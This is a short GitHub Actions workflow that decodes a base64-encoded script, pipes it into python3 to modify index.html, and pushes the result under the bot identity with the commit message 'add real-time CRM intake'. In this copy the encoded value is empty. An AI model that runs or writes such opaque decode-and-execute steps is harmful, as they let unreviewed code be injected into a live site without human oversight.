name: CRM Patch

on:
  push:
    paths:
      - '.github/workflows/apply-crm-hook.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Patch index.html
        env:
          PATCH_SCRIPT_B64: 
        run: echo "$PATCH_SCRIPT_B64" | base64 -d | python3
      - name: Commit changes
        run: |
          if git diff --quiet -- index.html; then
            echo "No changes needed"
            exit 0
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html
          git commit -m "feat: add real-time CRM intake"
          git push
